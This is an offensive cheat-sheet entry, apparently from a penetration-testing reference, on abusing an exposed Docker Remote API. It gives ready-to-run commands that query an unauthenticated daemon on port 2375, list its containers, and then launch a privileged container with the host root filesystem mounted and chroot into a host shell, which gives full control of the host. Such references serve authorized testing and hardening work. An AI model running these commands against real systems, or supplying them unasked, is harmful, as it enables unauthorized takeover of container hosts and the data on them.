---
technique: Docker Remote API Abuse
category: privilege-escalation
targets: Docker Engine
protocols: HTTP, HTTPS
remote_capable: true
tags: containers docker privilege-escalation api remote-api
---

# Docker Remote API Abuse

Docker Remote API abuse targets exposed Docker daemon endpoints that allow container creation and host filesystem mounts.

## Prerequisites

| Requirement | Detail |
|-------------|--------|
| API reachability | TCP 2375 or 2376 must be reachable |
| Weak auth | API must allow unauthenticated or credentialed access |
| Image availability | Host must have or pull a usable image |

## Linux

### Docker version endpoint

#sh #docker #api

Query the Docker API version endpoint.

```sh title:"Query Docker API version"
curl -s "http://$rhost:2375/version"
```
<!-- cheat
var rhost
-->

### Docker containers endpoint

#sh #docker #api

List containers through the Docker API.

```sh title:"List Docker API containers"
curl -s "http://$rhost:2375/containers/json"
```
<!-- cheat
var rhost
-->

### Docker client version

#sh #docker #api

Query a remote Docker daemon with the Docker client.

```sh title:"Query remote Docker daemon"
docker -H "tcp://$rhost:2375" version
```
<!-- cheat
var rhost
-->

### Run host mount container

#sh #docker #api

Run a container through a remote Docker daemon with the host filesystem mounted.

```sh title:"Run remote Docker host mount container"
docker -H "tcp://$rhost:2375" run --rm -it --privileged --net=host -v /:/host "$image_name" chroot /host /bin/sh
```
<!-- cheat
var rhost
var image_name
-->
